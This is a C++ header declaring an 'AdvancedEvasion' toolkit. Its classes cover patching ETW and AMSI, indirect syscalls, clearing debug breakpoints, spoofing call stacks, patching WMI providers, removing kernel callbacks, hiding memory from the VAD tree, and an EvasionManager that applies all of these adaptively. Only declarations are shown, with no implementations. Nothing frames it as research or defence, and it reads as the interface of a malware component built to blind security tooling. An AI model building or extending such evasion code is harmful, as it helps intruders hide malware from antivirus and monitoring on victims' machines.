#pragma once
#include <Windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <unordered_map>

namespace AdvancedEvasion {
    
    // ETW (Event Tracing for Windows) Evasion
    class ETWEvasion {
    public:
        static bool DisableETW();
        static bool PatchEtwEventWrite();
        static bool RestoreETW();
        
    private:
        static BYTE* g_originalBytes;
        static SIZE_T g_patchSize;
    };
    
    // Syscall Hooking and Indirect Syscalls
    class SyscallEvasion {
    public:
        // Initialize syscall evasion
        static bool Initialize();
        
        // Get syscall number dynamically
        static DWORD GetSyscallNumber(const char* functionName);
        
        // Define MEMORY_INFORMATION_CLASS if not defined
        typedef enum _MEMORY_INFORMATION_CLASS {
            MemoryBasicInformation
        } MEMORY_INFORMATION_CLASS;
        
        // Indirect syscall wrappers
        static NTSTATUS IndirectNtQueryVirtualMemory(
            HANDLE ProcessHandle,
            PVOID BaseAddress,
            MEMORY_INFORMATION_CLASS MemoryInformationClass,
            PVOID MemoryInformation,
            SIZE_T MemoryInformationLength,
            PSIZE_T ReturnLength
        );
        
        static NTSTATUS IndirectNtProtectVirtualMemory(
            HANDLE ProcessHandle,
            PVOID* BaseAddress,
            PSIZE_T RegionSize,
            ULONG NewProtect,
            PULONG OldProtect
        );
        
        static NTSTATUS IndirectNtAllocateVirtualMemory(
            HANDLE ProcessHandle,
            PVOID* BaseAddress,
            ULONG_PTR ZeroBits,
            PSIZE_T RegionSize,
            ULONG AllocationType,
            ULONG Protect
        );
        
    private:
        static DWORD g_syscallNumbers[32];
        static bool g_initialized;
        
        // Execute indirect syscall
        static NTSTATUS ExecuteIndirectSyscall(DWORD syscallNumber, ...);
    };
    
    // AMSI (Antimalware Scan Interface) Bypass
    class AMSIEvasion {
    public:
        static bool BypassAMSI();
        static bool PatchAmsiScanBuffer();
        static bool RestoreAMSI();
        
    private:
        static BYTE* g_originalAMSIBytes;
        static SIZE_T g_amsiPatchSize;
    };
    
    // Hardware Breakpoint Detection and Clearing
    class BreakpointEvasion {
    public:
        static bool DetectHardwareBreakpoints();
        static bool ClearHardwareBreakpoints();
        static bool DetectSoftwareBreakpoints(PVOID address, SIZE_T size);
        static bool ClearSoftwareBreakpoints(PVOID address, SIZE_T size);
        
    private:
        static bool CheckDebugRegisters();
        static void ClearDebugRegisters();
    };
    
    // Call Stack and Return Address Spoofing
    class StackEvasion {
    public:
        // Spoof return addresses on stack
        static void SpoofCallStack(PVOID legitimateAddress);
        
        // Call function with spoofed return address
        template<typename Func, typename... Args>
        static auto SpoofedCall(Func func, PVOID spoofAddress, Args... args) 
            -> decltype(func(args...));
        
        // Get legitimate return address from system module
        static PVOID GetLegitimateReturnAddress();
        
    private:
        static PVOID* GetCurrentStackFrame();
    };
    
    // WMI (Windows Management Instrumentation) Evasion
    class WMIEvasion {
    public:
        static bool DisableWMIEventTracing();
        static bool PatchWMIProviders();
        
    private:
        static bool EnumerateWMIProviders();
    };
    
    // Kernel Callback Manipulation (requires elevation)
    class KernelEvasion {
    public:
        // Check if we can access kernel structures
        static bool CanAccessKernel();
        
        // Remove process creation callbacks (requires kernel access)
        static bool RemoveProcessCallbacks();
        
        // Remove thread creation callbacks
        static bool RemoveThreadCallbacks();
        
        // Remove image load callbacks
        static bool RemoveImageLoadCallbacks();
        
    private:
        static bool IsElevated();
        static PVOID GetKernelModule(const char* moduleName);
    };
    
    // Memory Hiding Techniques
    class MemoryEvasion {
    public:
        // Hide memory region from VAD tree (requires kernel access)
        static bool HideFromVAD(PVOID address, SIZE_T size);
        
        // Create stealth memory allocation
        static PVOID StealthAllocate(SIZE_T size, DWORD protect);
        
        // Free stealth allocation
        static bool StealthFree(PVOID address);
        
        // Map memory with custom attributes
        static PVOID MapStealthMemory(PVOID preferredBase, SIZE_T size);
        
        // Made public for cleanup by EvasionManager
        static std::vector<PVOID> g_stealthAllocations;
    };
    
    // API Call Redirection
    class APIEvasion {
    public:
        // Initialize API redirection
        static bool Initialize();
        
        // Redirect API calls through legitimate modules
        static FARPROC GetRedirectedAPI(const char* module, const char* function);
        
        // Call API through legitimate path
        template<typename Func>
        static auto RedirectedCall(Func func, ...) -> decltype(func());
        
    private:
        static std::unordered_map<std::string, FARPROC> g_redirectedAPIs;
    };
    
    // Master evasion controller
    class EvasionManager {
    public:
        // Initialize all evasion techniques
        static bool InitializeAll();
        
        // Apply evasion based on detected environment
        static bool ApplyAdaptiveEvasion();
        
        // Cleanup all evasion techniques
        static void Cleanup();
        
        // Get current evasion status
        static bool GetEvasionStatus();
        
    private:
        static bool g_etwDisabled;
        static bool g_amsiDisabled;
        static bool g_syscallsHooked;
        static bool g_stackSpoofed;
    };
}
